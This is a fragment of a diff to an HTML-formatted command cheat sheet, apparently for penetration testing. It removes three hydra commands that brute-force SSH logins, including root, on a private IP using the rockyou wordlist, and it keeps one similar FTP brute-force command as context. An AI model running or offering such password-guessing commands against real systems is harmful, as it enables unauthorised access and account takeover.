@@ -1,9 +1,4 @@
 
-
-<span class="cmd">hydra</span> <span class="fl">-l</span> admin <span class="fl">-P</span> /usr/share/wordlists/rockyou.txt ssh<span class="op">://</span><span class="val">192.168.1.10</span>
-<span class="cmd">hydra</span> <span class="fl">-L</span> users.txt <span class="fl">-P</span> passwords.txt ssh<span class="op">://</span><span class="val">192.168.1.10</span>
-<span class="cmd">hydra</span> <span class="fl">-l</span> root <span class="fl">-P</span> rockyou.txt <span class="fl">-t</span> <span class="val">4</span> ssh<span class="op">://</span><span class="val">192.168.1.10</span>
-
 <span class="c"># ── FTP ───────────────────────────────────────────────────</span>
 <span class="cmd">hydra</span> <span class="fl">-l</span> admin <span class="fl">-P</span> rockyou.txt ftp<span class="op">://</span><span class="val">192.168.1.10</span>
 
